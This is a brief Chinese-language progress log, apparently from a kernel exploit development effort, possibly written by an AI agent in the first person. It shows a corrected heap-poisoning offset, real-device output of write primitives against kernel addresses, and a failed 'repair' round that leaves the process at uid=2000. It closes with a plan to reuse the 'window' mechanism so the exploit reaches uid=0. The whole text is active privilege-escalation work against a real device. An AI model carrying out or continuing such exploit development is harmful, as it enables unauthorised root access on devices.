# 43499 · W1b 落地 + 修复轮的调用路径差异（round 137）

## 改的一处（按退役原文 ✓）

```cpp
// 退役：w1_scratch_poison = heap.current.base + mcast.buffer_size
// 我此前写成 payload_base + buffer_size ✗ ⇒ 改为 prepared.base + buffer_size ✓
```

## 真机（本轮逐字 ✓）

```
main: step=w1 target=0xffffff802adaad88 layout matches=1 accepts=1 ✓
main: step=w2 target=0xffffff8917e7bd98 layout matches=1 accepts=1 ✓
main: step=w3 target=0xffffff88105eb600 layout matches=1 accepts=1 ✓
main: repair prepared base=0xffff800000018000   ← W1b 的第二份准备 ✓
main: repair prepared base=0xffff800000038000   ← W2b 的第二份准备 ✓
main: repair route status=2/61 attempts=20       ← ★ 其中一轮"消费者从未成功" ✗
main: victim uid=2000 ✗
```

## 差异定位（高置信 ✓）

| 轮次 | 调用路径 | 结果 |
| --- | --- | --- |
| 主轮（w1/w2/w3 ✓） | **窗口机制**：守卫 + Lua 驱动 + `settle`/arming（12 相位 ✓） | `status=0/0` ✓ |
| 我的修复轮 ✗ | 直接 `route.execute(target, value, 0)` ✗ | `status=2/61` ✗ |

⇒ 判据 61 是我自己的规则："`calls==0 || successes==0` ⇒ 61" ✓ ⇒ 即**消费者没赢** ✓ ⇒
⇒ 说明"直接 execute"少了窗口那套（守卫/arming/相位 ✓）⇒ 修复轮应当**走同一条窗口路径** ✓。

## 下一步（一条 ✓）

1. 让修复轮复用窗口机制（把"第二轮"当成同一 `stage_context` 的另一个请求 ✓，而不是绕过它 ✗）；
2. 判据：两轮修复均 `status=0/0` ✓（与主轮同形 ✓）；随后回到 `uid=0` ✓。
